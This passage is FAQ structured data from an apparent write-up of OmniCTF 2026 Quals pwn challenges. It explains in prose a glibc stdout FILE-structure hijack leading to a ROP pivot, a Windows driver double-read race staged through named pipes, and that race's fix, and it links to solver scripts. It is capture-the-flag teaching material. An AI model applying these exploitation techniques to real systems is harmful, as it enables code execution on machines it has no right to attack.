    {"@type": "Question","name": "Why target _IO_2_1_stdout_ instead of __free_hook or __malloc_hook?","acceptedAnswer": {"@type": "Answer","text": "__free_hook and __malloc_hook were removed in glibc 2.34. Ubuntu 24.04 ships glibc 2.39. _IO_2_1_stdout_ is one of the still-viable targets: overwrite with a fake _IO_FILE whose _wide_data points at a heap-controlled wide-file structure, set _IO_wfile_jumps' __doallocate slot to setcontext, embed a saved context that pivots rbp to a heap ROP stack. fflush(stdout) at exit routes through the fake vtable and clean-pivots to the ROP chain."}},
    {"@type": "Question","name": "How does the WinCapture race work and how big is the window?","acceptedAnswer": {"@type": "Answer","text": "COPY reads slot_lengths[slot] twice with a full function call between the reads. First read is used for a bounds check against g_pending_len; second is the memcpy length. A concurrent LOAD that changes slot_lengths[slot] from 8 to 0x1000 between the reads makes COPY copy 4 KB into an 8-byte reservation, overflowing into the adjacent 16-byte g_key. Race window: one function call (enormous by kernel race standards). Exploit lands on attempt 0 with delay 0."}},
    {"@type": "Question","name": "How does the named-pipe partial-send technique stage the race?","acceptedAnswer": {"@type": "Answer","text": "Windows named pipes let a client send input to a driver IOCTL handler in multiple WriteFile calls; the server thread blocks until the full expected input is buffered. Send COPY header without its 4-byte slot index to park the COPY thread inside the driver just before the read completes. Send LOAD header + 0x1007 of the 0x1008 body to park the LOAD thread the same way. Release COPY's final byte first; short spin delay; release LOAD's final byte. The scheduler interleaves both threads through the driver in a window narrower than a full IOCTL round-trip."}},
    {"@type": "Question","name": "What's the fix for the WinCapture double-read?","acceptedAnswer": {"@type": "Answer","text": "Three layers: (1) Read slot_lengths[slot] once into a local variable and use the same local for both the bounds check and the memcpy length. (2) Take a lock around the whole validation-and-copy sequence. (3) Cap slot_len at 0x1000 when LOAD stores it. The mistake is the classic TOCTOU: assuming a value validated at time A remains true at time B when the value is in shared attacker-writable state and there's an unlocked window between A and B."}},
    {"@type": "Question","name": "What's the broader lesson from the OmniCTF 2026 Quals pwn track?","acceptedAnswer": {"@type": "Answer","text": "Modern mitigations are speed bumps for exploit development, not ceilings: nullshui runs against Full RELRO/canary/NX/PIE/SHSTK/IBT/safe-linking and reaches code execution in eight steps by routing around each via legitimate control-flow paths. 'Too small to exploit in practice' is a hypothesis, not a defence: both bugs (nullshui's single zero-qword write, WinCapture's double-read race) are ones reviewers would dismiss on visible size; the actual exploitability question depends on downstream state."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solver scripts at github.com/Abdelkad3r/OmniCTF-2026-Quals. nullshui ships a Python solve.py using pwntools, plus the extracted libc.so.6 and ld-linux-x86-64.so.2 from the pinned Ubuntu 24.04 image. WinCapture ships exploit.c (compile with MinGW) and send_exploit.py (base64 helper for the remote runner). Both reproducible against fresh remote instances."}}
  ]
}
</script>
